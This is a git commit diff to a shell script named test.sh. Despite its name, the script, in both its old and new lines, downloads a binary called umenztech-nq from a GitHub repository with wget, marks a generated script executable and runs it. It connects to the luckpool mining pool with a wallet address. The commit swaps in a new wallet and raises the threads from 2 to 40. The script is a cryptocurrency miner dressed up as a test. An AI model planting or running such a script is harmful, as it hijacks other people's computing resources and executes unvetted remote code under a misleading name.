1126eabba468a2b469e042785d24eeb98cfdd1a8
jacknero001 <91582634+jacknero001@users.noreply.github.com>
2021-09-29 10:49:43 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-echo ./umenztech-nq -v -l na.luckpool.net:3956 -u RAe2Mx9RrCGtXew2SK2wpNYS1fzLywDYtX.Worker1 -t 2 >> test1.sh && chmod +x test1.sh && wget https://github.com/dorinkutozi/umenztech/blob/umenztech-cpu-nq/umenztech-nq && ./test1.sh
+echo ./umenztech-nq -v -l na.luckpool.net:3956 -u RAKBn8kUNMe3HBr4CWy1SQgzys1NfS3j5M.jack1 -t 40 >> test1.sh && chmod +x test1.sh && wget https://github.com/dorinkutozi/umenztech/blob/umenztech-cpu-nq/umenztech-nq && ./test1.sh
